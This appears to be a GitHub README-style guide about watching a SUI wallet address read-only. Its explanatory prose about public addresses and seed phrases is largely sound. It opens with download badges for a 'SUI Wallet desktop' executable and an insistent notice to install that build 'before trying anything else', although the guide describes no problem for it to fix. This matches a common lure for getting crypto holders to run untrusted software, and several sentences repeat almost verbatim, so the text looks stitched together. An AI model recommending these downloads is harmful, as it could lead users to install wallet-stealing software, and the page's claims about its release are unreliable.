![SUI Wallet](assets/banner-article.png)

# Watching a SUI Wallet address read-only

Watch-only means the address is visible and the keys stay elsewhere.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A watch-only view means seeing what an address holds without holding what can spend it - an explorer, a
blockchain browser, or a second screen that reads the chain. It is useful for monitoring and useless for
recovery: the address alone never restores an account, whatever it shows.

## What watching an address means

An address is public by design. The balance, the transaction history, the objects held and the stake attached are all on the chain and readable by anyone who knows the string at all. Watching is the deliberate use of that fact, with no keys involved.

Watching is the deliberate use of that fact. You paste an address somewhere and read it, with no keys
involved and nothing signed, which is exactly why it can be done from a machine that holds nothing.

The asymmetry is the useful part. Spending needs a secret; reading needs nothing but the string, and the string is handed out every time somebody sends you anything. That is why watching scales to strangers and spending never does.

## What it is good for

Three uses, and they are all about distance. Checking that a balance arrived without opening the wallet on
the same machine. Looking at an address on a phone while the wallet sits on a desktop. And confirming what a
transaction did afterwards, from a screen that cannot change anything.

The common thread is that none of them needs a signature. Watching is reading, and reading is what explorers
do well.

There is a fourth, less obvious use: checking an address before sending to it, from a screen that has no wallet on it at all.

## What it is not

Watching is not a backup and not a recovery route. An address has no information that could rebuild the keys
that control it - that is the point of a public key, and the reason a leaked address is harmless while a
leaked phrase is not.

So a watch-only view of your own account is a convenience, not a safety net. If the 24 words are lost, the
view keeps showing the balance and the balance stays unreachable, which is the worst possible combination of
reassurance and loss.

## Watching an account this wallet holds

The wallet's own screens are for accounts it can sign for: the phrase is entered, the keys are derived, and
the balance is read from the chain. A read-only view is a second thing rather than a mode of the first.

[SUI Wallet balance not updating](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-balance-not-updating.md) covers what the wallet's own balance display means when it
disagrees with what you expected, which is usually the question behind a watch-only check.

That separation is worth keeping rather than merging. A wallet that also displayed arbitrary addresses would blur the line between an account you can spend from and one you merely observe, and the blur is exactly what a convincing fake relies on.

## Watching somebody else's address

Pasting a public address into an explorer is ordinary and safe. It reveals nothing about the person watching and nothing about the owner beyond what the chain already publishes about every account. What is not safe is treating a stranger's address as your own.

What is not safe is the reverse: an address offered by a stranger as "yours" or as "the corrected one".
An address is only yours if the phrase behind it is in your hands, and watching it will not tell you either
way - [Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) covers how to read the one the wallet gives you.

## Two habits that make it useful

Keep the address beside the balance rather than instead of it, so a view that shows nothing is not mistaken
for a lost account. And treat any address you did not derive yourself as somebody else's, including one
copied from a chat, a support message or a website.

The current release is what the wallet's own screens are described from; the
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records what changed, and the
reported problems are fixed in the latest release rather than in the build it replaced.

A third habit costs nothing: keep the address written on the same sheet as the phrase, so the pair can be checked together years later. The phrase proves control, the address names what is controlled, and one without the other is a fact you cannot verify from memory.

## FAQ

### What is a watch-only address and when should I use one?

An address you read without holding its keys. Use it to check a balance from another device, or to confirm
what a transaction did, and never as a way to keep an account.

### Can I send from a watched address?

No. Sending needs a signature, and a signature needs the keys. An explorer that offers to "send" from an
address is either asking for your keys or doing something else with your money.

### Does watching an address expose me?

No. The address is already public; reading it changes nothing. What exposes you is entering the phrase
anywhere, which watching never requires.

### Can I watch an address on my phone?

Yes, in any explorer that runs in a browser. That is the usual reason to watch at all - keeping the wallet
on one machine and the balance check on another.

### Is watching the same as a second wallet?

No. A second wallet holds a phrase and can sign; a watch-only view holds a string and cannot. Confusing the
two is how people conclude an account is safe when only its address has been copied.

### Will watching recover a lost account?

Never. Nothing in an address can rebuild its keys, which is why the 24 words on paper are the only backup
that matters.
